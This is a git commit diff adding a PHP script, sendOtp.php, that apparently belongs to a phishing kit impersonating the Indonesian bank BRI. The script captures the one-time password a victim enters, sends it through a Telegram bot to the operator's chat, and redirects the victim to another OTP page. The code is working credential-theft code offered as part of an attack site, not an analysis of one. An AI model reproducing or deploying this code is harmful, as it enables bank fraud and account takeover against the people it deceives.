73df9b3dc8e9dbb570fec880157e9610751db179
pengembang2025 <167019524+pengembang2025@users.noreply.github.com>
2024-05-03 19:16:26 +0700

    unzipgit

---
+++ CS-BRI/sendOtp.php
@@ -0,0 +1,27 @@
+<?php 
+
+
+
+session_start();
+include "./telegram.php";
+
+
+
+$message = "❁┷━❃𝗕𝗥𝗜.𝗖𝗢.𝗜𝗗❃━┷❁". "\n𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 :\n".$_POST ['otp'];
+
+function sendMessage($telegram_id, $message, $id_bot)
+{
+$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($telegram_id, $message, $id_bot);
+header("Location:  otp.html");
+?> 
